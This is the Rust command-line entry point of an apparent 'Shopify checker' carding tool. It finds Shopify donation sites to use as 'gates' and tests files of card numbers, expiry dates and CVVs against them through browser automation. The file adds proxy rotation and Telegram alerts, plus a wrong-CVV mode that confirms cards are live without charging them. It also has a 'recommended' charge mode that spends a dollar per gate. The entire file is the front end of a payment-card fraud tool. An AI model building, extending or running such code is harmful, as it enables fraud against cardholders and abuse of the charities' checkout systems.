use anyhow::Result;
use clap::{Parser, Subcommand};
use colored::*;
use shopify_checker::analyzer;
use std::io::{self, Write};

#[derive(Parser)]
#[command(name = "shopify_checker")]
#[command(about = "Unified Shopify donation site analyzer and card checker", long_about = None)]
#[command(version = "0.2.0")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Analyze Shopify gates to find donation sites
    Analyze {
        /// Directory containing gate text files
        #[arg(short, long, default_value = "/home/null/Desktop/ShopifyGates")]
        input: String,
        
        /// Output JSON file for donation gates
        #[arg(short, long, default_value = "donation_gates.json")]
        output: String,
        
        /// Maximum number of sites to check in detail (default: all)
        #[arg(short, long)]
        max: Option<usize>,
        
        /// Enable concurrent processing (faster but more resource intensive)
        #[arg(short, long)]
        concurrent: bool,
        
        /// Number of concurrent workers (default: 10)
        #[arg(short, long, default_value = "10")]
        workers: usize,
    },
    
    /// ROTATIONAL GATE MODE: Find working gate, use it for all cards until it fails, then rotate
    Rotate {
        /// Input gates JSON file
        #[arg(short, long, default_value = "production_gates.json")]
        gates: String,
        
        /// Output results JSON file
        #[arg(short, long, default_value = "rotate_results.json")]
        output: String,
        
        /// Maximum number of gates to test (default: all)
        #[arg(short, long)]
        max_gates: Option<usize>,
        
        /// Cards file (REQUIRED - format: number|month|year|cvv, one per line)
        #[arg(short, long, required = true)]
        cards_file: String,
        
        /// Telegram configuration file (enables Telegram notifications)
        #[arg(long)]
        telegram_config: Option<String>,
        
        /// Authorization-only mode: Use wrong CVV to check cards WITHOUT charging (default: true)
        /// To disable and use charged mode, add --no-auth-only
        #[arg(long, default_value_t = true, action = clap::ArgAction::Set)]
        auth_only: bool,
        
        /// Proxy file (format: host:port:username:password, one per line)
        #[arg(long)]
        proxy_file: Option<String>,
    },
    
    /// SMART CARD MODE: Try multiple cards per gate until one works, then use that card for all remaining gates
    Smart {
        /// Input gates file (JSON or plain text)
        #[arg(short, long, required = true)]
        gates: String,
        
        /// Output results JSON file
        #[arg(short, long, default_value = "smart_results.json")]
        output: String,
        
        /// Maximum number of gates to test (default: all)
        #[arg(short, long)]
        max_gates: Option<usize>,
        
        /// Cards file (REQUIRED - format: number|month|year|cvv, one per line)
        #[arg(short, long, required = true)]
        cards_file: String,
        
        /// Authorization-only mode: Use wrong CVV to check cards WITHOUT charging (default: false for smart mode)
        #[arg(long, default_value_t = false, action = clap::ArgAction::Set)]
        auth_only: bool,
        
        /// Proxy file (format: host:port:username:password, one per line)
        #[arg(long)]
        proxy_file: Option<String>,
    },
    
    /// DISCOVERY MODE: Cycle through ALL gates to find valid ones, save them, and prioritize in future runs
    Discover {
        /// Directory containing gate text files
        #[arg(long, required = true)]
        gates_dir: String,
        
        /// Output results JSON file
        #[arg(short, long, default_value = "discovery_results.json")]
        output: String,
        
        /// Maximum number of gates to test (default: all)
        #[arg(short, long)]
        max_gates: Option<usize>,
        
        /// Cards file (REQUIRED - format: number|month|year|cvv, one per line)
        #[arg(short, long, required = true)]
        cards_file: String,
        
        /// Telegram configuration file (enables Telegram notifications)
        #[arg(long)]
        telegram_config: Option<String>,
        
        /// Authorization-only mode: Use wrong CVV to check cards WITHOUT charging (default: true)
        #[arg(long, default_value_t = true, action = clap::ArgAction::Set)]
        auth_only: bool,
        
        /// Proxy file (format: host:port:username:password, one per line)
        #[arg(long)]
        proxy_file: Option<String>,
    },
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║     Shopify Checker - Unified Rust Implementation        ║".cyan());
    println!("{}", "║     Analyze gates & test cards with browser automation   ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    
    print_banner();
    
    match cli.command {
        Commands::Analyze { input, output, max, concurrent, workers } => {
            run_analyzer(&input, &output, max, concurrent, workers)?;
        }
        Commands::Rotate { gates, output, max_gates, cards_file, telegram_config, auth_only, proxy_file } => {
            run_checker_rotate(&gates, &output, max_gates, &cards_file, telegram_config.as_deref(), auth_only, proxy_file.as_deref())?;
        }
        Commands::Smart { gates, output, max_gates, cards_file, auth_only, proxy_file } => {
            run_checker_smart(&gates, &output, max_gates, &cards_file, auth_only, proxy_file.as_deref())?;
        }
        Commands::Discover { gates_dir, output, max_gates, cards_file, telegram_config, auth_only, proxy_file } => {
            run_checker_discover(&gates_dir, &output, max_gates, &cards_file, telegram_config.as_deref(), auth_only, proxy_file.as_deref())?;
        }
    }
    
    Ok(())
}

fn run_analyzer(input_dir: &str, output_file: &str, max_check: Option<usize>, concurrent: bool, workers: usize) -> Result<()> {
    println!("\n{}", "🔍 ANALYZE MODE: Finding Donation Sites".bold().green());
    println!();
    
    // Load gates
    println!("{}", "Loading Shopify gates...".yellow());
    let gates = analyzer::load_shopify_gates(input_dir)?;
    println!("{} Loaded {} Shopify gates\n", "✓".green(), gates.len());
    
    // Ask user how many to check
    let max_check = if let Some(max) = max_check {
        max
    } else {
        println!("{}", format!("Total gates loaded: {}", gates.len()).yellow());
        println!("{}", "Recommendation: Check all gates for complete database".cyan());
        
        print!("How many sites to check in detail? (Enter 'all' or number, default: all): ");
        io::stdout().flush()?;
        
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let input = input.trim().to_lowercase();
        
        if input.is_empty() || input == "all" {
            gates.len()
        } else {
            input.parse::<usize>().unwrap_or(gates.len())
        }
    };
    
    println!("{} Will check {} gates\n", "✓".green(), max_check);
    
    // Analyze gates
    let verified_sites = analyzer::analyze_gates(gates, max_check)?;
    
    // Display results
    analyzer::display_results(&verified_sites);
    
    // Save results
    if !verified_sites.is_empty() {
        analyzer::save_results(&verified_sites, output_file)?;
        
        println!("\n{}", "═".repeat(60).cyan());
        println!("{}", "✅ Analysis Complete!".bold().green());
        println!("{}", "═".repeat(60).cyan());
        println!("\n{}", "Next steps:".bold().yellow());
        println!("  1. Review the donation sites in {}", output_file.cyan());
        println!("  2. Run {} to test cards", "shopify_checker rotate".cyan());
        println!();
    }
    
    Ok(())
}

fn run_checker_rotate(
    gates_file: &str,
    output_file: &str,
    max_gates: Option<usize>,
    cards_file: &str,
    telegram_config: Option<&str>,
    auth_only: bool,
    proxy_file: Option<&str>,
) -> Result<()> {
    use shopify_checker::checker_v3;
    
    println!("\n{}", "🔄 ROTATIONAL GATE MODE: Smart Gate Rotation".bold().green());
    println!("{}", "   ✨ Find working gate first".cyan());
    println!("{}", "   ✨ Use one gate for ALL cards".cyan());
    println!("{}", "   ✨ Rotate only when gate fails (3 consecutive failures)".cyan());
    println!("{}", "   ✨ Much more efficient than testing each card on all gates".cyan());
    println!();
    
    if auth_only {
        println!("{}", "🔐 AUTHORIZATION-ONLY MODE ENABLED".bold().green());
        println!("{}", "   ✓ Using wrong CVV (999) to check cards".yellow());
        println!("{}", "   ✓ Cards will NOT be charged".green());
        println!("{}", "   ✓ Only CVV_MISMATCH responses count as valid".yellow());
    } else {
        println!("{}", "💳 CHARGE MODE ENABLED".bold().yellow());
        println!("{}", "   ⚠️  Using real CVV - cards MAY be charged!".red());
        println!("{}", "   ⚠️  Use --auth-only to enable safe mode".dimmed());
    }
    println!();
    
    if let Some(proxy_path) = proxy_file {
        println!("{}", format!("🔒 Proxy support enabled (file: {})", proxy_path).green());
    }
    
    if let Some(config_path) = telegram_config {
        println!("{}", format!("✓ Telegram notifications enabled (config: {})", config_path).green());
    }
    
    println!("{}", format!("✓ Loading cards from: {}", cards_file).green());
    println!();
    
    // Check if ChromeDriver is running
    println!("{}", "⚠️  Important: ChromeDriver must be running on port 9515".yellow());
    println!("{}", "   Start it with: chromedriver --port=9515 &".dimmed());
    println!();
    
    print!("Is ChromeDriver running? (y/n): ");
    io::stdout().flush()?;
    
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    
    if input.trim().to_lowercase() != "y" {
        println!("\n{}", "Please start ChromeDriver first:".yellow());
        println!("  {}", "chromedriver --port=9515 &".cyan());
        println!("\nThen run this command again.");
        return Ok(());
    }
    
    // Run the rotational gate checker
    tokio::runtime::Runtime::new()?.block_on(async {
        checker_v3::run_checker_v3(gates_file, output_file, max_gates, cards_file, telegram_config, auth_only, proxy_file).await
    })?;
    
    println!("\n{}", "═".repeat(60).cyan());
    println!("{}", "✅ Rotational Testing Complete!".bold().green());
    println!("{}", "═".repeat(60).cyan());
    println!("\n{}", "Results saved to:".bold().yellow());
    println!("  {}", output_file.cyan());
    println!();
    
    Ok(())
}

fn run_checker_smart(
    gates_file: &str,
    output_file: &str,
    max_gates: Option<usize>,
    cards_file: &str,
    auth_only: bool,
    proxy_file: Option<&str>,
) -> Result<()> {
    use shopify_checker::checker_smart;
    
    println!("\n{}", "🧠 SMART CARD MODE: Intelligent Card Rotation".bold().green());
    println!("{}", "   ✨ Try multiple cards per gate until one works".cyan());
    println!("{}", "   ✨ Once card works, use it for ALL remaining gates".cyan());
    println!("{}", "   ✨ When card dies, find next working card".cyan());
    println!("{}", "   ✨ Maximizes gate discovery with minimal card usage".cyan());
    println!();
    
    if auth_only {
        println!("{}", "🔐 AUTHORIZATION-ONLY MODE".bold().green());
        println!("{}", "   ✓ Using wrong CVV (999) - no charges".yellow());
    } else {
        println!("{}", "💳 CHARGE MODE (RECOMMENDED)".bold().yellow());
        println!("{}", "   ⚠️  Using real CVV - $1 per valid gate".red());
    }
    println!();
    
    if let Some(proxy_path) = proxy_file {
        println!("{}", format!("🔒 Proxy support enabled (file: {})", proxy_path).green());
    }
    
    println!("{}", format!("✓ Loading cards from: {}", cards_file).green());
    println!("{}", format!("✓ Loading gates from: {}", gates_file).green());
    println!();
    
    // Check if ChromeDriver is running
    println!("{}", "⚠️  Important: ChromeDriver must be running on port 9515".yellow());
    println!("{}", "   Start it with: chromedriver --port=9515 &".dimmed());
    println!();
    
    print!("Is ChromeDriver running? (y/n): ");
    io::stdout().flush()?;
    
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    
    if input.trim().to_lowercase() != "y" {
        println!("\n{}", "Please start ChromeDriver first:".yellow());
        println!("  {}", "chromedriver --port=9515 &".cyan());
        println!("\nThen run this command again.");
        return Ok(());
    }
    
    // Run the smart checker
    tokio::runtime::Runtime::new()?.block_on(async {
        checker_smart::run_smart_checker(gates_file, output_file, max_gates, cards_file, auth_only, proxy_file).await
    })?;
    
    println!("\n{}", "═".repeat(60).cyan());
    println!("{}", "✅ Smart Testing Complete!".bold().green());
    println!("{}", "═".repeat(60).cyan());
    println!("\n{}", "Results saved to:".bold().yellow());
    println!("  {}", output_file.cyan());
    println!();
    
    Ok(())
}

fn run_checker_discover(
    gates_dir: &str,
    output_file: &str,
    max_gates: Option<usize>,
    cards_file: &str,
    telegram_config: Option<&str>,
    auth_only: bool,
    proxy_file: Option<&str>,
) -> Result<()> {
    use shopify_checker::gate_discovery;
    
    println!("\n{}", "🔍 DISCOVERY MODE: Gate Discovery & Prioritization".bold().green());
    println!("{}", "   ✨ Cycle through ALL gates to find valid ones".cyan());
    println!("{}", "   ✨ Save valid gates for future use".cyan());
    println!("{}", "   ✨ Prioritize proven gates (5x weight)".cyan());
    println!("{}", "   ✨ Continuous learning and optimization".cyan());
    println!();
    
    if auth_only {
        println!("{}", "🔐 AUTHORIZATION-ONLY MODE ENABLED".bold().green());
        println!("{}", "   ✓ Using wrong CVV (999) to check cards".yellow());
        println!("{}", "   ✓ Cards will NOT be charged".green());
        println!("{}", "   ✓ Only CVV_MISMATCH responses count as valid".yellow());
    } else {
        println!("{}", "💳 CHARGE MODE ENABLED".bold().yellow());
        println!("{}", "   ⚠️  Using real CVV - cards MAY be charged!".red());
        println!("{}", "   ⚠️  Use --auth-only to enable safe mode".dimmed());
    }
    println!();
    
    if let Some(proxy_path) = proxy_file {
        println!("{}", format!("🔒 Proxy support enabled (file: {})", proxy_path).green());
    }
    
    if let Some(config_path) = telegram_config {
        println!("{}", format!("✓ Telegram notifications enabled (config: {})", config_path).green());
    }
    
    println!("{}", format!("✓ Loading cards from: {}", cards_file).green());
    println!("{}", format!("✓ Loading gates from directory: {}", gates_dir).green());
    println!();
    
    // Check if ChromeDriver is running
    println!("{}", "⚠️  Important: ChromeDriver must be running on port 9515".yellow());
    println!("{}", "   Start it with: chromedriver --port=9515 &".dimmed());
    println!();
    
    print!("Is ChromeDriver running? (y/n): ");
    io::stdout().flush()?;
    
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    
    if input.trim().to_lowercase() != "y" {
        println!("\n{}", "Please start ChromeDriver first:".yellow());
        println!("  {}", "chromedriver --port=9515 &".cyan());
        println!("\nThen run this command again.");
        return Ok(());
    }
    
    // Run the discovery checker
    tokio::runtime::Runtime::new()?.block_on(async {
        gate_discovery::run_discovery(gates_dir, output_file, max_gates, cards_file, telegram_config, auth_only, proxy_file).await
    })?;
    
    println!("\n{}", "═".repeat(60).cyan());
    println!("{}", "✅ Discovery Complete!".bold().green());
    println!("{}", "═".repeat(60).cyan());
    println!("\n{}", "Results saved to:".bold().yellow());
    println!("  {}", output_file.cyan());
    println!("  {}", "valid_gates.json (valid gates database)".cyan());
    println!();
    
    Ok(())
}
